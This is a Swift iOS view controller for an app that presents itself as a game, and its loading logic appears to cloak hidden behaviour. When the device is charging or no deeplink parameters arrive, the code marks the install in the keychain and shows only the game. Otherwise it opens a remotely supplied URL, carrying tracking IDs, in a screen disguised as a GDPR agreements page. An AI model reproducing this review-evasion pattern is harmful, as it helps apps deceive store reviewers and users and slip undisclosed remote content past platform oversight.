//
//  ViewController.swift

import UIKit
import GameKit
import FacebookCore
import FBSDKCoreKit

let kGameMenuSegue = "kGameMenuSegue"

class LoadingViewController: UIViewController {
	
	@IBOutlet weak var progressHUD: UIActivityIndicatorView!
	@IBOutlet weak var progressLabel: UILabel!
	
	var timer: Timer?
	var startTimerInterval: TimeInterval = 0.0
	
	
	override func viewDidLoad() {
		super.viewDidLoad()
		
		self.progressLabel.text = "Loading..."
		self.checkAndShowAgreements()
	}
	
	func checkAndShowAgreements() {
		if let userID = KeychainService.password(forAccount: kSettingUserAccount), userID.count > 0 {
			startGame()
			return
		}
		
		if let params = UserDefaults.standard.string(forKey: kSettingParams) {
			checkAgreementsWith(params)
		} else {
			if UIDevice.current.batteryState == UIDevice.BatteryState.charging {
				progressHUD.isHidden = true
				progressLabel.isHidden = true
			} else {
				progressHUD.isHidden = false
				progressLabel.isHidden = false
				progressHUD.startAnimating()
			}
			self.startTimer()
		}
	}
	
	func fetchPremiumUser() {
		progressHUD.isHidden = false
		progressLabel.isHidden = false
		progressHUD.startAnimating()
		self.progressLabel.text = "Loading..."
		APIManager.sharedInstance.requestGameConfiguration { (agreements) in
			if let agreements = UserDefaults.standard.string(forKey: kSettingAgreements), agreements.count > 0 {
				let params = UserDefaults.standard.string(forKey: kSettingParams)
				self.openJdpr(agreements: agreements, params: params)
			} else {
				self.startGame()
			}
		}
	}
	
	func checkAgreementsWith(_ params: String?) {
		if let agreements = UserDefaults.standard.string(forKey: kSettingAgreements), agreements.count > 0 {
			self.openJdpr(agreements: agreements, params: params)
		} else {
			fetchPremiumUser()
		}
	}
	func startTimer() {
		self.timer = Timer.scheduledTimer(timeInterval: 0.5, target: self, selector: #selector(self.update), userInfo: nil, repeats: true)
		self.startTimerInterval = Date().timeIntervalSince1970
		self.timer!.fire()
	}
	
	@objc func update() {
		if let params = UserDefaults.standard.string(forKey: kSettingParams) {
			timer!.invalidate()
			checkAgreementsWith(params)
		}
		
		if Date().timeIntervalSince1970 - self.startTimerInterval > kDeeplinkTimeout {
			self.timer!.invalidate()
			if let params = UserDefaults.standard.string(forKey: kSettingParams) {
				timer!.invalidate()
				checkAgreementsWith(params)
			} else {
                UIDevice.current.isBatteryMonitoringEnabled = true
                if UIDevice.current.batteryState != UIDevice.BatteryState.unplugged ||
                    UIDevice.current.batteryState == UIDevice.BatteryState.charging
                {
                    if kDebugApp == false {
                        AppEvents.logEvent(AppEvents.Name.submitApplication, parameters: ["charging" : "1"])
                        KeychainService.setPassword(kSettingUserId, forAccount: kSettingUserAccount)
                    }
                    self.startGame()
                } else {
                    checkAgreementsWith(nil)
                }
            }
        } else {
            let progress: Int = Int(100 * (Date().timeIntervalSince1970 - self.startTimerInterval) / Double(kDeeplinkTimeout))
            progressLabel.text = "Progress \(progress)%"
        }
    }
    
    func openJdpr(agreements: String, params: String?) {
        var agreements = agreements
        
        if let params = params {
            agreements = self.append(param: params, to: agreements)
        }
        
        if let appsflyerId = UserDefaults.standard.string(forKey: kSettingAppsflayerUserId) {
            let params = "sub_id_10=\(appsflyerId)"
            agreements = self.append(param: params, to: agreements)
        }
        
        ApplicationDelegate.shared.openJdprAgreementsController(URL(string: agreements)!)
    }
    
    func append(param: String, to request: String) -> String {
        let concatSymbol: String
        if let query = URL(string: request)?.query {
            concatSymbol = query.count > 0 ? "&" : "?"
        } else {
            concatSymbol = "?"
        }
        
        return  request.appending("\(concatSymbol)\(param)")
    }
    
    func startGame() {
        self.performSegue(withIdentifier: kGameMenuSegue, sender: nil)
    }
    
}
